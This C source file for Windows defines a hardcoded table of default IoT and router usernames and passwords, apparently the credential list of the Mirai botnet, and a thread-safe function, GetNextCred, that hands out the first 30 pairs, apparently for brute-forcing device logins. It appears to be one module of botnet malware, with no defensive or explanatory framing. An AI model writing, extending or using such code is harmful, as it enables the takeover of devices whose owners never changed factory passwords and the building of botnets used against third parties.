#include <windows.h>
#include "credit.h"

static Cred creds[] = {
    {"root", "xc3511"},
    {"root", "vizxv"},
    {"root", "admin"},
    {"admin", "admin"},
    {"root", "888888"},
    {"root", "xmhdipc"},
    {"root", "default"},
    {"root", "juantech"},
    {"root", "123456"},
    {"root", "54321"},
    {"support", "support"},
    {"root", ""},
    {"admin", "password"},
    {"root", "root"},
    {"root", "12345"},
    {"user", "user"},
    {"admin", ""},
    {"root", "pass"},
    {"admin", "admin1234"},
    {"root", "1111"},
    {"admin", "smcadmin"},
    {"admin", "1111"},
    {"root", "666666"},
    {"root", "password"},
    {"root", "1234"},
    {"root", "klv123"},
    {"Administrator", "meinsm"},
    {"service", "service"},
    {"supervisor", "supervisor"},
    {"guest", "guest"},
    {"guest", "12345"},
    {"guest", "12345"},
    {"admin1", "password"},
    {"administrator", "1234"},
    {"666666", "666666"},
    {"888888", "888888"},
    {"ubnt", "ubnt"},
    {"root", "klv1234"},
    {"root", "Zte521"},
    {"root", "hi3518"},
    {"root", "jvbzd"},
    {"root", "anko"},
    {"root", "zlxx."},
    {"root", "7ujMko0vizxv"},
    {"root", "7ujMko0admin"},
    {"root", "system"},
    {"root", "ikwb"},
    {"root", "dreambox"},
    {"root", "user"},
    {"root", "realtek"},
    {"root", "00000000"},
    {"admin", "1111111"},
    {"admin", "1234"},
    {"admin", "12345"},
    {"admin", "54321"},
    {"admin", "123456"},
    {"admin", "7ujMko0admin"},
    {"admin", "4321"},
    {"admin", "pass"},
    {"admin", "meinsm"},
    {"tech", "tech"},
    {"mother", "fucker"}
};

static const int creds_count = sizeof(creds) / sizeof(creds[0]);
static SRWLOCK cred_lock = SRWLOCK_INIT;
static int current_idx = 0;

BOOL GetNextCred(Cred *out_cred) {
    if (out_cred == NULL) {
        return FALSE;
    }

    BOOL success = FALSE;

    AcquireSRWLockExclusive(&cred_lock);

    if (current_idx < creds_count && current_idx < 30) {
        *out_cred = creds[current_idx++];
        success = TRUE;
    } else {
        // Optional: zero out the struct if out of bounds
        out_cred->username = NULL;
        out_cred->password = NULL;
    }

    ReleaseSRWLockExclusive(&cred_lock);
    return success;
}
